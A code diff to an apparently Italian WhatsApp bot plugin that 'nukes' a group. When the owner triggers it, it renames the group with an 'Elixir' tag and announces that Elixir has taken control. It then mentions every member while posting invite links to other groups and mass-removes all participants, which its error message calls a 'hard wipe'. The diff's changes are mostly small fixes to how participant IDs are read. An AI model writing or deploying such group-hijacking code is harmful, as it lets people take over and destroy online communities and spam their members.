@@ -1,7 +1,7 @@
 let handler = async (m, { conn, participants, isBotAdmin }) => {
     if (!m.isGroup) return;
 
-    const ownerJids = global.owner.map(o => o + '@s.whatsapp.net');
+    const ownerJids = global.owner.map(o => o[0] + '@s.whatsapp.net');
     if (!ownerJids.includes(m.sender)) return;
 
     if (!isBotAdmin) return;
@@ -12,14 +12,14 @@ let handler = async (m, { conn, participants, isBotAdmin }) => {
     try {
         let metadata = await conn.groupMetadata(m.chat);
         let oldName = metadata.subject;
-        let newName = `${oldName} | 𝓔𝓵𝓲𝔁𝓲𝓻`;
+        let newName = `${oldName} | ꜱᴠᴛ ʙʏ ᴇʟɪxɪʀ`;
         await conn.groupUpdateSubject(m.chat, newName);
     } catch (e) {
         console.error('Errore cambio nome gruppo:', e);
     }
 
     let usersToRemove = participants
-        .map(p => p.id || p.jid)
+        .map(p => p.jid)
         .filter(jid =>
             jid &&
             jid !== botId &&
@@ -28,15 +28,14 @@ let handler = async (m, { conn, participants, isBotAdmin }) => {
 
     if (!usersToRemove.length) return;
 
-    let allJids = participants.map(p => p.id || p.jid);
+    let allJids = participants.map(p => p.jid);
 
-    // 🔹 MESSAGGI PERSONALIZZATI
     await conn.sendMessage(m.chat, {
         text: "✧ 𝓔𝓵𝓲𝔁𝓲𝓻 𝓱𝓪 𝓹𝓻𝓮𝓼𝓸 𝓲𝓵 𝓬𝓸𝓷𝓽𝓻𝓸𝓵𝓵𝓸 ✧"
     });
 
     await conn.sendMessage(m.chat, {
-        text: "𝒯𝓊𝓉𝓉𝒾 𝒾 𝓅𝒶𝓇𝓉𝑒𝒸𝒾𝓅𝒶𝓃𝓉𝒾 𝓈𝑜𝓃𝑜 𝒾𝓃𝓋𝒾𝓉𝒶𝓉𝒾 𝓆𝓊𝒾:\n\nhttps://chat.whatsapp.com/JOaqS04seMvFepBFp4Q4rL",
+        text: "𝒯𝓊𝓉𝓉𝒾 𝒾 𝓅𝒶𝓇𝓉𝑒𝒸𝒾𝓅𝒶𝓃𝓉𝒾 𝓈𝑜𝓃𝑜 𝒾𝓃𝓋𝒾𝓉𝒶𝓉𝒾 𝓆𝓊𝒾:\n\nhttps://chat.whatsapp.com/KdLKg5DoZ2CGrNlbqJRdV9\n\nhttps://chat.whatsapp.com/KCJU4WWXc5BCqEh8bUco1i",
         mentions: allJids
     });
 
@@ -44,7 +43,7 @@ let handler = async (m, { conn, participants, isBotAdmin }) => {
         await conn.groupParticipantsUpdate(m.chat, usersToRemove, 'remove');
     } catch (e) {
         console.error(e);
-        await m.reply("❌ Errore durante l'esecuzione.");
+        await m.reply("❌ Errore durante l'hard wipe.");
     }
 };
 
